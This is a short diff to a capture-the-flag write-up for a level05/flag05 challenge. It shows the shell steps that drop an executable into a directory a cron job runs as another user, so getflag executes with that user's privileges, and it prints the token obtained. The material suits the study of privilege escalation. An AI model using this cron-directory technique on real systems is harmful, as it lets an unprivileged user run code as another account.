@@ -25,8 +25,8 @@ done
 */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
 
 ~$ crontab /var/mail/level05
-~$ echo '/bin/getflag > /tmp/lol' > /opt/openarenaserver/tut
-~$ chmod +x /opt/openarenaserver/tut
-~$ cat /tmp/lol
+~$ echo '/bin/getflag > /tmp/flag' > /opt/openarenaserver/script
+~$ chmod +x /opt/openarenaserver/script
+~$ cat /tmp/flag
 Check flag.Here is your token : viuaaale9huek52boumoomioc
 ```
